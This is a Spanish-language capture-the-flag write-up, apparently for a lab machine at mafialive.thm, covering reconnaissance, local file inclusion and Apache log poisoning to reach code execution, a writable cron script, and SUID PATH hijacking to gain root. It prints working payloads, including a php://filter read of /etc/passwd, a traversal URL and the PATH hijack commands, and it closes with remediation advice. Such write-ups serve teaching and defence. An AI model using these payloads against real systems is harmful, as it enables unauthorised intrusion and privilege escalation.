---
tags:
  - LFI
  - web
  - Path_Hijacking
  - CronJobs
  - Nmap
  - burpsuite
  - php
  - log_poisoning
  - apache
---

# **Introducción**

El propósito de este análisis es documentar paso a paso el proceso de explotación de la máquina objetivo, comenzando desde el reconocimiento inicial hasta la escalada final de privilegios para obtener acceso como **root**.  
Durante la evaluación se aplicaron técnicas de enumeración web, explotación mediante **Local File Inclusion (LFI)**, **log poisoning**, obtención de una **reverse shell** y escalada de privilegios mediante la explotación de una **cronjob insegura** y un binario con **PATH Hijacking**.

El objetivo principal de este writeup es describir de forma clara y técnica las vulnerabilidades identificadas, su explotación efectiva y los mecanismos inseguros presentes en el sistema que permitieron comprometerlo completamente. Este documento también proporciona recomendaciones para mitigar estos fallos y fortalecer la seguridad del entorno.
# Reconocimiento inicial

Comencé realizando un escaneo de puertos utilizando **nmap** para identificar los servicios expuestos en la máquina objetivo:

```bash
┌──(zikuta㉿kali)-[~/Desktop/LFI]
└─$ nmap -sS -p- -Pn --min-rate 5000 10.201.6.57 -oN ports.txt               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-16 10:30 EST
Nmap scan report for 10.201.6.57
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

**Resultados:**

- **Puerto 22/tcp** - SSH abierto
- **Puerto 80/tcp** - HTTP abierto

Posteriormente, ejecuté un escaneo más exhaustivo sobre los puertos detectados:

```bash
┌──(zikuta㉿kali)-[~/Desktop/LFI]
└─$ nmap -sV -sC -Pn -p22,80  --min-rate 5000 -oN escaneo.txt 10.201.6.57 
Nmap scan report for 10.201.6.57
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Servicios identificados:**

- **SSH (22/tcp)**: OpenSSH 7.6p1 Ubuntu
- **HTTP (80/tcp)**: Apache httpd 2.4.29 (Ubuntu)
- **Sistema operativo**: Linux (Ubuntu)

# Enumeracion Web

Al acceder al servidor web en el puerto 80, identifiqué en la interfaz un correo de soporte:
 support@mafialive.thm. Esto sugiere la existencia de un dominio interno de la organización, por lo que procedí a agregarlo al archivo `/etc/hosts` para facilitar el acceso.

<img width="1917" height="641" alt="Image" src="https://github.com/user-attachments/assets/4dd0dd07-edd0-4521-a305-8d6f6502897b" />


Luego al recargar el sitio web nos encontraremos con la primera flag 

<img width="971" height="258" alt="Image" src="https://github.com/user-attachments/assets/eab4858d-c535-4bac-b9d8-dfc49b8761d2" />

## Enumeración Web y Descubrimiento de LFI

Continué con la enumeración de directorios utilizando **Feroxbuster**:

```bash
┌──(zikuta㉿kali)-[~/Desktop/LFI]
└─$ feroxbuster -u http://mafialive.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,,js 
                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.12.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://mafialive.thm/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.12.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, , js]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       15l       21w      286c http://mafialive.thm/test.php
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        3l        3w       59c http://mafialive.thm/
```

**Hallazgos importantes:**

- **200 GET** - `http://mafialive.thm/test.php`

Al acceder a `test.php`, descubrí una funcionalidad que permitía interactuar con la aplicación. Al hacer clic en un botón, observé que la URL cambiaba a:

<img width="1057" height="312" alt="Image" src="https://github.com/user-attachments/assets/8effa40d-99e5-4267-821c-808a8582681a" />

## Explotación de Vulnerabilidad LFI (Local File Inclusion)

Este patrón en la URL indica claramente una **vulnerabilidad de Local File Inclusion (LFI)**, donde el parámetro `view` está siendo utilizado para incluir archivos del sistema sin una validación adecuada.

## Bypass de Filtros LFI

Al intentar acceder al archivo `/etc/passwd` directamente mediante `http://mafialive.thm/test.php?view=/etc/passwd` 

<img width="850" height="298" alt="Image" src="https://github.com/user-attachments/assets/170724a5-474b-48fb-912c-ce8c27cc93f0" />

El sistema respondió con un mensaje de error: **"Sorry, Thats not allowed"**, indicando la presencia de un mecanismo de filtrado que bloquea el acceso a rutas sensibles del sistema.

### Estrategia de Bypass usando Wrappers PHP

Para evadir este filtro, utilicé **wrappers PHP**, que son streams que permiten acceder a diferentes recursos usando las funciones de E/S de PHP. El más útil para este escenario es `php://filter`.

**Payload utilizado:**

```php
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/etc/passwd
```

**Explicación del wrapper:**

- `php://filter/` - Indica que usaremos el filtro de streams
- `convert.base64-encode` - Codifica el contenido del archivo en base64
- `resource= - Especifica el archivo objetivo

### Ventajas de este Enfoque

1. **Evita detección**: El filtro probablemente no reconoce `php://filter` como una ruta peligrosa
2. **Codificación segura**: Base64 evita que el contenido se interprete como código PHP
3. **Flexibilidad**: Permite leer archivos del sistema


<img width="1918" height="372" alt="Image" src="https://github.com/user-attachments/assets/995986d1-4869-4861-b6dc-a8368ec69914" />


### Ejecución y Resultados

Realicé la petición con el wrapper y obtuve una respuesta diferente: el sistema devolvió el contenido del archivo `test.php` codificado en base64. Para decodificarlo: realice lo siguiente 

```bash
┌──(zikuta㉿kali)-[~/Desktop/LFI]
└─$ echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 --decode 
```

## Análisis del Código

Al decodificar el archivo `test.php` obtenido mediante el wrapper PHP, descubrimos el código fuente de la aplicación:

### Hallazgos Clave en el Código

**Lógica de filtrado identificada:**

```php
if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
    include $_GET['view'];
}
```

El filtro permite solo archivos que:

-  NO contengan `../..` (directory traversal)
- SÍ contengan `/var/www/html/development_testing`

### Estrategia de Log Poisoning

Dado que el filtro restringe el LFI a un directorio específico, procedí con **Log Poisoning** para lograr RCE (Remote Code Execution).

**Ruta del log de Apache identificada:** `/var/log/apache2/access.log`

<img width="1918" height="372" alt="Image" src="https://github.com/user-attachments/assets/fceea468-2b90-4255-a739-c32d509725c2" />

### Log Poisoning

### ¿Qué es Log Poisoning?

El **Log Poisoning** es una técnica que consiste inyectar código malicioso en los archivos de log del servidor para luego ejecutarlo a través de una vulnerabilidad LFI. Apache guarda todas las peticiones HTTP en `/var/log/apache2/access.log`, incluyendo los headers como User-Agent.

### Configuración del Ataque con Burp Suite

**Paso 1: Interceptar la petición inicial**

- Abrí Burp Suite y activé el proxy
- Navegué a `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//..//var/log/apache2/access.log`
-  Intercepté la petición con Burp

**Paso 2: Modificar el User-Agent y Envenenar Log** 
Cambié el header User-Agent para inyectar una webshell PHP:

<img width="1919" height="287" alt="Image" src="https://github.com/user-attachments/assets/a2ef5aa7-633f-4e60-a27d-f672af699c36" />
Al enviar esta petición, el servidor registra nuestro User-Agent malicioso en:

```bash
/var/log/apache2/access.log
```

### Ejecución de Comandos via LFI

**Paso 4: Acceder al log envenenado**  
Utilicé la vulnerabilidad LFI para incluir el archivo de log, pero con un bypass del filtro:

<img width="1257" height="738" alt="Image" src="https://github.com/user-attachments/assets/ab3ab8e7-8411-41ad-b043-5dd1b4c00e0f" />
**Explicación del bypass:**

- `view=/var/www/html/development_testing/` - Cumple con el filtro
- `../../../../` - Navega hacia directorios superiores
- `var/log/apache2/access.log` - Accede al archivo de log
- `&cmd=id` - Ejecuta el comando `id` a través de nuestra webshell

### Flujo del Ataque

1. **Inyección**: User-Agent malicioso → access.log
2. **Inclusión**: LFI incluye access.log como PHP
3. **Ejecución**: PHP interpreta nuestro código en el log
4. **Resultado**: Comando `id` ejecutado y output mostrado

## Obtención de Reverse Shell y Escalada de Privilegios

### Paso 1: Configurar Listener

Primero preparé mi máquina atacante para recibir la conexión reversa:

```bash
┌──(zikuta㉿kali)-[~/Desktop/LFI]
└─$ penelope -p 4444
```

### Paso 2: Ejecutar Reverse Shell via LFI

Utilicé la vulnerabilidad LFI con log poisoning para ejecutar la reverse shell en Python:

<img width="1917" height="423" alt="Image" src="https://github.com/user-attachments/assets/6805a00b-96ed-4a6a-b50c-30482333b7d4" />


### Paso 3: Reconocimiento del Sistema

Una vez recibida la reverse shell y estabilizada con penelope, identifiqué la presencia del usuario **warchangel** en el sistema:

<img width="1665" height="507" alt="Image" src="https://github.com/user-attachments/assets/3c9c10af-498e-44e5-9c1b-323a69b5662a" />

# Escalada de privilegios 

Al obtener acceso como `www-data` procedi a checar si habia alguna `cronjob` corriendo por detras y me encontre con lo siguiente

<img width="1505" height="441" alt="Image" src="https://github.com/user-attachments/assets/4ee5eeda-440b-427f-abfc-3cfbe79d6a2f" />

habia una cronjob corriendo el archivo `helloworld.sh` asi que decidi ir hacia el directorio `/opt` para checar que permisos tenia yo sobre el archivo.

```bash
www-data@ubuntu:/opt$ ls -la
total 16
drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
```

Encontre que tengo permisos para modificar el archivo, asi que decidi agregarle un codigo que nos proporcionara una `reverse shell` en `bash`.

y mientras tanto me puse en escucha en otro puerto utilizando la herramienta `penelope`

<img width="1444" height="330" alt="Image" src="https://github.com/user-attachments/assets/713a0c00-997e-4f52-b8fb-e501d274dc52" />

ahora que ya soy el usuario `archangel` tengo permisos para poder interactuar con los otros archivos, entre ellos me encontre un binario llamado `backup` al hacerle `strings` al binario `backup` me encontre con algo que llamo mucho mi atencion.

<img width="1036" height="522" alt="Image" src="https://github.com/user-attachments/assets/3a755b19-4c1c-41cd-958c-f2f0f667561f" />
Durante el análisis del binario `backup`, se ejecutó `strings` sobre el archivo y se observó que el programa utilizaba el comando `cp` sin emplear una ruta absoluta, es decir

El uso de comandos sin ruta absoluta (`/bin/cp`) es una mala práctica de seguridad, ya que permite que el sistema busque el ejecutable a través de las rutas definidas en la variable de entorno `$PATH`. Si un atacante puede colocar un ejecutable malicioso con el mismo nombre en un directorio que se evalúe primero que `/bin`, puede forzar al programa a ejecutar dicho archivo.  
Cuando el binario es SUID root, esto permite obtener una shell como root.

# ¿Cuál es el problema EXACTO?

La línea debería verse así si fuera segura:

```bash
/bin/cp /home/user/archangel/myfiles/* /opt/backupfiles
```

Pero en su lugar se ve:

```bash
cp /home/user/archangel/myfiles/* /opt/backupfiles
```

**Eso significa que el binario está llamando a “cp” desde la variable $PATH.**

Es decir, NO está diciendo:

> “Ejecuta /bin/cp”

Sino:

> “Busca un archivo llamado cp en los directorios del PATH y ejecuta el primero que encuentres”.

# ¿Por qué es inseguro?

Porque si TÚ (el atacante) puedes:

- Crear un archivo ejecutable llamado `cp`
- Colocarlo en un directorio que se evalúe ANTES que `/bin`
- Modificar el `$PATH` (o si el programa ya usa un PATH inseguro)

Entonces el programa ejecutará **tu archivo** en vez del verdadero `/bin/cp`.

Y si el binario es SUID root o corre como root →  
 **tu archivo se ejecuta como root**.

## **Preparación del binario malicioso**

El primer paso consistió en crear un ejecutable llamado `cp` dentro de un directorio bajo control del usuario. Este archivo simplemente ejecuta una shell:

```bash
echo '/bin/bash' > cp
chmod +x cp
```

## **Manipulación de la variable PATH**

Para asegurarnos de que nuestro binario malicioso `cp` fuese encontrado antes que el verdadero `/bin/cp`, se modificó la variable `$PATH`, añadiendo el directorio actual al inicio:

```bash
export PATH=$(pwd):$PATH
```

De esta forma, cuando el binario `backup` invoque el comando `cp`, el sistema ejecutará nuestro archivo malicioso.

## **Ejecución del binario vulnerable**

Finalmente, se ejecutó el binario `backup`, el cual posee el bit SUID establecido:

```bash
./backup
```

Al ejecutarse, el programa intentó utilizar el comando `cp` como parte de su funcionalidad interna. Debido a la manipulación del PATH, terminó ejecutando nuestro binario malicioso en su lugar. Esto resultó en la obtención de una shell con privilegios de root:

<img width="721" height="111" alt="Image" src="https://github.com/user-attachments/assets/2cd5bb6e-b138-4c73-9ce0-f9f5cdfe62bf" />
# Cuadro de Explotacion

| Etapa                             | Descripción                                                      | Herramientas               | Resultado                                                |
| --------------------------------- | ---------------------------------------------------------------- | -------------------------- | -------------------------------------------------------- |
| **1. Reconocimiento**             | Escaneo de puertos y servicios expuestos.                        | `nmap`                     | Servicios SSH (22) y HTTP (80) descubiertos.             |
| **2. Enumeración Web**            | Descubrimiento de dominio y archivos expuestos.                  | Navegador, `feroxbuster`   | Hallazgo de `test.php` y funcionalidad vulnerable.       |
| **3. LFI (Local File Inclusion)** | Identificación del parámetro vulnerable `view`.                  | Manual, `php://filter`     | Lectura de archivos y bypass de filtros usando wrappers. |
| **4. Análisis del Código**        | Obtención del código fuente con base64.                          | `base64`, `php://filter`   | Descubrimiento del filtro y ruta permitida.              |
| **5. Log Poisoning**              | Inyección de webshell en el `access.log` a través de User-Agent. | Burp Suite                 | Ejecución de comandos mediante LFI → RCE.                |
| **6. Reverse Shell**              | Ejecución de payload para obtener shell interactiva.             | Python, `penelope`         | Acceso como `www-data`.                                  |
| **7. Escalada a archangel**       | Abuso de cronjob modificable (`helloworld.sh`).                  | Bash                       | Reverse shell como usuario archangel.                    |
| **8. Análisis SUID**              | Descubrimiento de binario `backup` vulnerable.                   | `strings`, análisis manual | Identificación de PATH Hijacking.                        |
| **9. Escalada a root**            | Creación de `cp` malicioso y manipulación del PATH.              | Bash                       | Ejecución del binario como root → Shell root.            |

# **Conclusión**

Durante la explotación de la máquina se observaron múltiples vulnerabilidades críticas que permitieron comprometer completamente el sistema.  
El proceso comenzó con una vulnerabilidad **LFI** que, combinada con un **log poisoning**, permitió lograr **Remote Code Execution** y posicionarse en el sistema como el usuario `www-data`.

Posteriormente, se identificó una **cronjob insegura** que ejecutaba un script modificable por un usuario no privilegiado, permitiendo escalar a `archangel`. Finalmente, se encontró un binario SUID que utilizaba comandos sin rutas absolutas, lo cual permitió realizar un **PATH Hijacking** obteniendo acceso total como **root**.

Este caso evidencia cómo la combinación de varias malas prácticas de desarrollo y administración puede derivar en la pérdida total de control del sistema.

---

#  **Recomendaciones**

## **1. Validación estricta de parámetros (LFI)**

- Evitar incluir archivos basados en parámetros GET.
- Implementar whitelists reales y no validaciones parciales.
- Deshabilitar la inclusión dinámica (`allow_url_include`, etc.).

## **2. Configuración segura de logs**

- No permitir que headers sin sanitizar se escriban directamente en archivos ejecutados por PHP.
- Mover logs fuera del alcance del webserver.

## **3. Manejo correcto de permisos**

- Los scripts ejecutados por cron **nunca** deben ser editables por usuarios no privilegiados.
- Asignar permisos 600 o 700 según corresponda.
- Revisar permisos peligrosos como `777`.

## **4. Evitar uso de rutas relativas en binarios**

- Todos los comandos deben ejecutarse con **ruta absoluta**.
- Auditar binarios SUID para prácticas inseguras.

## **5. Deshabilitar SUID innecesarios**

- Revisar binarios con `find / -perm -4000` y deshabilitar los no esenciales.
## **6. Mantener el sistema actualizado**

- Apache, PHP y OpenSSH deben mantenerse en versiones seguras y soportadas.
